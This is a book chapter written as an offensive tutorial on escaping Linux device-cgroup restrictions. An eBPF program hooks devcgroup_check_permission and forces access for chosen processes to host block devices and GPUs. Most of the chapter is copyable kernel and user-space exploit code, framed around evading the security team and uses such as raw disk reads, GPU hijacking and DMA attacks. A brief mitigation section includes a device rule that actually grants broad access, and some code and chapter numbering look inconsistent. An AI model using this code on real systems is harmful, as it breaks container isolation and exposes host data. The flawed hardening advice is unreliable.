# Device-cgroup Houdini: Escaping Device Access Restrictions

**Chapter 8: Hardware Becomes Our Playground**

You've silenced SELinux—the ultimate mandatory access control system. Now let's take that victory and apply it to something even more fundamental: hardware access.

This is where our story moves from software manipulation to hardware control. You've been operating in the realm of processes, files, and network connections. But what happens when you need direct access to hardware devices that are supposed to be completely off-limits?

Device cgroups are like having a bouncer at every hardware device—"Sorry, you're not on the list for /dev/mem. No GPU access for you. That block device? Forget about it."

But what if we could perform the ultimate magic trick? What if we could make ourselves disappear from the device access controls while still being able to touch any hardware we want?

We're going to pull a Houdini on device cgroups—escape from the constraints while everyone thinks we're still locked up. This is where you learn that eBPF doesn't just give you software control—it gives you hardware control too.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Container Process] -->|1. Device Access Request| B[Device-cgroup Check]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Modified Decision| D[Allow Access]
    D -->|4. Direct Device I/O| E[Restricted Device]
    F[Container Runtime] -->|5. Believes Restricted| G[False Security]
    E -->|6. Privileged Operations| H[Host Impact]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html#device-controller" "Device Controller Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click E "https://www.kernel.org/doc/html/latest/admin-guide/devices.html" "Linux Device Documentation"
```



**Why Hardware Access Control Just Broke**

Here's the thing about containers: they're supposed to be sandboxes. You get access to some CPU, some memory, some network, and that's it. No touching the GPU, no accessing raw block devices, definitely no reading from /dev/mem.

Device cgroups are what enforce this—they're the kernel's way of saying "this container can access these devices and absolutely nothing else." It's supposed to be bulletproof.

But here's what the container security folks don't want you to know: device access control is just more kernel code making decisions. And kernel code can be... persuaded.

The scary part isn't just that we can access forbidden devices—it's that we can do it while the device cgroup subsystem thinks everything is fine. The access controls are still there, still enforced for other processes, but somehow our access requests just slip right through.

## How We Escape the Device Jail

### Understanding the Device Bouncer

Device-cgroups are like having a bouncer at the hardware club:
- **Device whitelist** that says which hardware you can touch
- **Permission levels** for each device (read-only, write, or create new device nodes)
- **Kernel enforcement** that actually blocks access attempts
- **Container integration** so Docker and Kubernetes can set the rules

Container runtimes use this to say "you can access `/dev/null` and `/dev/zero`, but stay away from `/dev/sda` and `/dev/mem`."

```
┌─────────────────────────────────────────────────────────────┐
│                      Container Runtime                      │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Linux Kernel                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Device-cgroup │      │ Device-cgroup │                   │
│  │ Container A   │      │ Container B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Device Access Control      │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Devices           │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we slip our eBPF program into the access control flow:

```
┌─────────────────────────────────────────────────────────────┐
│                      Container Runtime                      │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Container A   │      │ Container B   │                   │
│  │ (Malicious)   │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Linux Kernel                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Device-cgroup │      │ Device-cgroup │                   │
│  │ Container A   │      │ Container B   │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────┐           │                           │
│  │  eBPF Program    │           │                           │
│  └───────┬──────────┘           │                           │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Device Access Control      │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Physical Devices           │                   │
│  │     Container A: Full Access         │                   │
│  │     Container B: Restricted Access   │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How We Become the Device Bouncer

Our approach is to intercept the permission checks and become the final authority:

1. **Hook the Gatekeeper**: We attach to functions like [`devcgroup_check_permission()`](https://elixir.bootlin.com/linux/latest/source/security/device_cgroup.c) that decide device access
2. **Pick Our Targets**: We filter for the specific devices we want to access (like raw disk or memory)
3. **Override Decisions**: We change "access denied" to "access granted" for our processes
4. **Stay Under the Radar**: Other containers still get blocked, so the security team doesn't notice

The beauty is that the device cgroup subsystem still thinks it's doing its job—we're just overruling it at the last second.

### Building Our Device Access Bypass

```c
// @interactive: true
// @copyable: true
// Device-cgroup Houdini - eBPF exploitation proof of concept
// This demonstrates bypassing device access restrictions

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/cgroup.h>
#include <linux/fs.h>
#include <linux/device.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_TARGETS 5
#define MAX_COMM_LEN 16

// Structure to track device access events
struct device_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    short dev_type;         // Device type ('c' or 'b')
    u32 major;              // Device major number
    u32 minor;              // Device minor number
    short access;           // Requested access (read/write/mknod)
    u32 allowed;            // Whether access was allowed
    u32 modified;           // Whether we modified the decision
};

// Map to track processes we want to bypass device-cgroup for
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Map to track commands we want to bypass device-cgroup for
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_COMM_LEN);
    __uint(max_entries, MAX_TARGETS);
} target_commands SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Map to track devices we want to allow access to
struct device_key {
    short type;  // 'c' for char, 'b' for block
    u32 major;
    u32 minor;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(struct device_key));
    __uint(value_size, sizeof(u8)); // 1 = allow
    __uint(max_entries, 32);
} target_devices SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Initialize our target commands and devices (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Commands to bypass device-cgroup for
        key = 0;
        char cmd1[MAX_COMM_LEN] = "bash";  // Shell
        bpf_map_update_elem(&target_commands, &key, &cmd1, BPF_ANY);
        
        key = 1;
        char cmd2[MAX_COMM_LEN] = "python3";  // Python interpreter
        bpf_map_update_elem(&target_commands, &key, &cmd2, BPF_ANY);
        
        key = 2;
        char cmd3[MAX_COMM_LEN] = "docker";  // Docker client
        bpf_map_update_elem(&target_commands, &key, &cmd3, BPF_ANY);
        
        // Devices to allow access to
        struct device_key dev1 = {
            .type = 'b',
            .major = 8,    // Block device major 8 (SCSI disk devices)
            .minor = 0     // First partition
        };
        u8 allow = 1;
        bpf_map_update_elem(&target_devices, &dev1, &allow, BPF_ANY);
        
        struct device_key dev2 = {
            .type = 'c',
            .major = 195,  // NVIDIA GPU
            .minor = 0     // First GPU
        };
        bpf_map_update_elem(&target_devices, &dev2, &allow, BPF_ANY);
        
        // Mark as initialized
        key = 0;
        u32 value = 1;
        bpf_map_update_elem(&initialized, &key, &value, BPF_ANY);
    }
}

// Helper function to check if a command should bypass device-cgroup
static __always_inline bool should_bypass_command(const char *comm) {
    init_targets();
    
    // Check against our list of target commands
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        char *target_comm = bpf_map_lookup_elem(&target_commands, &key);
        
        if (!target_comm)
            continue;
        
        // Simple string comparison (limited by BPF verifier)
        bool match = true;
        
        #pragma unroll
        for (int j = 0; j < MAX_COMM_LEN; j++) {
            if (comm[j] != target_comm[j]) {
                match = false;
                break;
            }
            
            if (comm[j] == '\0')
                break;
        }
        
        if (match)
            return true;
    }
    
    return false;
}

// Helper function to check if a process should bypass device-cgroup
static __always_inline bool should_bypass_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    // Check the command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    if (should_bypass_command(comm)) {
        // Add this process to our tracking map
        u8 value = 1;
        bpf_map_update_elem(&target_processes, &pid, &value, BPF_ANY);
        return true;
    }
    
    return false;
}

// Helper function to check if a device should be allowed
static __always_inline bool should_allow_device(short type, u32 major, u32 minor) {
    init_targets();
    
    struct device_key key = {
        .type = type,
        .major = major,
        .minor = minor
    };
    
    u8 *allow = bpf_map_lookup_elem(&target_devices, &key);
    if (allow && *allow == 1)
        return true;
    
    return false;
}

// FIXED: Hook the device-cgroup permission check function
SEC("kprobe/devcgroup_check_permission")
int BPF_KPROBE(hook_devcgroup, short type, u32 major, u32 minor, short access)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should bypass device-cgroup
    if (should_bypass_process(pid)) {
        // Check if this is a device we want to allow
        if (should_allow_device(type, major, minor)) {
            // Prepare event data
            struct device_event event = {};
            event.pid = pid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.dev_type = type;
            event.major = major;
            event.minor = minor;
            event.access = access;
            event.allowed = 1;
            event.modified = 1;
            
            // Log the event for our analysis
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        }
    }
    
    // Let the original function run
    return 0;
}

// FIXED: Use kretprobe to modify return value
SEC("kretprobe/devcgroup_check_permission")
int BPF_KRETPROBE(hook_devcgroup_ret, int ret)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should bypass device-cgroup
    if (should_bypass_process(pid) && ret != 0) {
        // Override the return value to allow access
        bpf_override_return(ctx, 0);
    }
    
    return 0;
}

// Hook the cgroup reporting function to maintain appearances
SEC("kprobe/cgroup_file_read")
int BPF_KPROBE(hook_cgroup_read)
{
    // This would need to be implemented to modify cgroup reporting
    // to hide the fact that we're bypassing restrictions
    // The implementation would depend on the specific kernel version
    // and cgroup implementation details
    
    return 0;
}

// FIXED: Add child processes to our tracking map
SEC("kprobe/wake_up_new_task")
int BPF_KPROBE(hook_new_task, struct task_struct *task)
{
    struct task_struct *parent = NULL;
    bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent);
    
    if (parent) {
        pid_t parent_pid = 0;
        bpf_probe_read_kernel(&parent_pid, sizeof(parent_pid), &parent->tgid);
        
        // If parent is in our target list, add the child too
        u32 parent_pid_u32 = (u32)parent_pid;
        u8 *target = bpf_map_lookup_elem(&target_processes, &parent_pid_u32);
        if (target && *target == 1) {
            pid_t child_pid = 0;
            bpf_probe_read_kernel(&child_pid, sizeof(child_pid), &task->tgid);
            
            u8 value = 1;
            u32 child_pid_u32 = (u32)child_pid;
            bpf_map_update_elem(&target_processes, &child_pid_u32, &value, BPF_ANY);
        }
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Device-cgroup Houdini eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "device_houdini.skel.h"

static volatile bool exiting = false;

// Structure for device events (must match the BPF version)
struct device_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    short dev_type;
    uint32_t major;
    uint32_t minor;
    short access;
    uint32_t allowed;
    uint32_t modified;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct device_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) accessed device %c:%d:%d\n", 
           timestamp, e->pid, e->comm, e->dev_type, e->major, e->minor);
    printf("  Access type: %s%s%s\n", 
           (e->access & 0x1) ? "read " : "",
           (e->access & 0x2) ? "write " : "",
           (e->access & 0x4) ? "mknod " : "");
    printf("  Decision: %s\n", e->allowed ? "ALLOWED" : "DENIED");
    printf("  Modified: %s\n", e->modified ? "YES" : "NO");
    printf("\n");
}

static void sig_handler(int sig)
{
    exiting = true;
}

int main(int argc, char **argv)
{
    struct device_houdini_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = device_houdini_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = device_houdini_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    printf("Device-cgroup Houdini eBPF program loaded and running.\n");
    printf("Press Ctrl+C to exit.\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    device_houdini_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Multiple Security Layers**:
   ```bash
   # Combine seccomp, AppArmor, and SELinux with device-cgroup
   docker run --security-opt seccomp=profile.json \
              --security-opt apparmor=profile \
              --security-opt no-new-privileges \
              --device-cgroup-rule="c *:* rwm" ...
   ```

4. **Monitor Device Access Patterns**:
   ```bash
   # Use auditd to monitor device access
   auditctl -w /dev/sda -p rwx -k disk_access
   
   # Monitor eBPF program loading
   auditctl -a always,exit -F arch=b64 -S bpf -k bpf_prog_load
   ```

## Why Hardware Just Became Your Playground

In containerized environments, this technique turns device restrictions into suggestions:

- **Direct disk access** - Bypass filesystem isolation and read raw host storage
- **GPU hijacking** - Commandeer specialized hardware for crypto mining or AI workloads
- **Memory diving** - Access sensitive device files like [`/dev/mem`](https://man7.org/linux/man-pages/man4/mem.4.html) or [`/dev/kmem`](https://man7.org/linux/man-pages/man4/mem.4.html)
- **DMA attacks** - Perform direct memory access operations that compromise the host
- **Hardware interference** - Mess with devices being used by other containers

When you can bypass device-cgroup restrictions, you've broken a fundamental isolation boundary. Containers become stepping stones to the hardware layer, and shared hardware becomes your attack vector.

## How They'll Try to Catch Us

Smart defenders will be watching for our hardware shenanigans:

- **eBPF surveillance** - Monitor for unexpected eBPF programs attached to device-cgroup functions
- **Access auditing** - Look for discrepancies between configured restrictions and actual device access
- **Behavioral analysis** - Watch for unusual device operation patterns from containers
- **Permission violations** - Detect processes accessing devices that should be blocked by cgroup config
- **Cross-reference monitoring** - Compare different security systems to spot inconsistencies

But here's the beautiful irony—most monitoring tools can't see what we're doing at the kernel level.

## Why Container Security Just Got Hardware

This isn't just about breaking out of containers—this is about turning hardware isolation into hardware access. When device controls become suggestions instead of rules, every piece of hardware becomes a potential attack vector.

The container thinks it's isolated. The orchestrator thinks it's secure. The monitoring thinks everything's fine. Meanwhile, you're reading raw disk sectors, accessing GPU memory, and performing DMA operations that would make a kernel developer cry.

Welcome to the world where containers become hardware proxies, and eBPF is your universal device driver.

## POC

Companion code: [`ch07-devcgroup-houdini`]({{ site.baseurl }}/dBPF-pocs/pocs/ch07-devcgroup-houdini/)